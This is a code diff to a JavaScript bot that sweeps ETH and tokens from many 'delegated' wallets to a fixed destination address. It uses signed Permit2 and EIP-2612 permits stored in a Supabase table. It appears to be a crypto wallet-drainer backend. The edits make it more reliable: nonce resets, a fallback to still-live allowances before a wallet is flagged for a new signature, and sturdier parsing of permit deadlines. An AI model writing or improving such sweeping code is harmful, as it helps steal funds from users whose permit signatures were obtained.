@@ -377,7 +377,7 @@ async function sweepETH() {
     log(`sweepETH tx: ${tx.hash}`);
     await tx.wait();
     log("sweepETH confirmed");
-  } catch (e) { err(`sweepETH: ${e.message}`); }
+  } catch (e) { maybeResetNonce(e); err(`sweepETH: ${e.message}`); }
   finally    { sweepingETH = false; }
 }
 
@@ -399,7 +399,7 @@ async function sweepToken(tokenAddress) {
     const tx  = await contract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
     log(`sweepTokens(${symbol}) tx: ${tx.hash}`);
     await tx.wait();
-  } catch (e) { err(`sweepToken(${tokenAddress}): ${e.message}`); }
+  } catch (e) { maybeResetNonce(e); err(`sweepToken(${tokenAddress}): ${e.message}`); }
   finally     { sweepingToken[key] = false; }
 }
 
@@ -910,9 +910,16 @@ async function sweepGaslessWallet(walletAddress) {
       warn(`[gasless/batch] deadline EXPIRED for ${checksum} (${new Date(Number(batch.deadline) * 1000).toISOString()}) — marking spent`);
       if (supabase) {
         try {
+          // Check if on-chain AllowanceTransfer still covers the wallet before flagging reactivation.
+          // ETH-bot parity: never set needs_reactivation when a live AllowanceTransfer backup exists.
+          const hasBackup = await hasLivePermit2Allowance(checksum).catch(() => false);
           await supabase.from("delegated_wallets")
-            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+            .update({
+              permit_metadata:   { ...meta, signatureTransfers: { ...batch, spent: true } },
+              needs_reactivation: !hasBackup,
+            })
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
+          if (!hasBackup) warn(`[gasless/batch] no AllowanceTransfer backup — needs_reactivation set for ${checksum.slice(0,10)}`);
         } catch (e) { err(`[gasless/batch] Supabase update: ${e.message}`); }
       }
       return;
@@ -1092,12 +1099,17 @@ async function sweepGaslessWallet(walletAddress) {
       }
       if (supabase) {
         try {
+          // Check AllowanceTransfer backup before setting needs_reactivation — a
+          // TRANSFER_FROM_FAILED or InvalidNonce error does NOT necessarily mean the
+          // user needs to re-sign; the AllowanceTransfer (TIER 3) may still work.
+          const hasBackup = await hasLivePermit2Allowance(checksum).catch(() => false);
           await supabase.from("delegated_wallets")
             .update({
               permit_metadata:   { ...meta, signatureTransfers: { ...batch, spent: true } },
-              needs_reactivation: true,
+              needs_reactivation: !hasBackup,
             })
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
+          if (!hasBackup) warn(`[gasless/batch] no AllowanceTransfer backup — needs_reactivation set for ${checksum.slice(0,10)}`);
         } catch (e2) { err(`[gasless/batch] Supabase spent update: ${e2.message}`); }
       }
     }
@@ -1577,7 +1589,13 @@ async function sweep(wallet) {
 
     for (const p of permits ?? []) {
       if (BLACKLIST.has(p.token.toLowerCase())) continue;
-      const dl = typeof p.deadline === "string" ? BigInt(Math.floor(new Date(p.deadline).getTime() / 1000)) : 0n;
+      const dl = typeof p.deadline === "number"
+        ? BigInt(p.deadline)
+        : typeof p.deadline === "string" && /^\d+$/.test(p.deadline.trim())
+          ? BigInt(p.deadline.trim())
+          : typeof p.deadline === "string"
+            ? BigInt(Math.floor(new Date(p.deadline).getTime() / 1000))
+            : 0n;
       if (dl > 0n && dl < nowSecs) {
         log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — expired, marking used`);
         await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
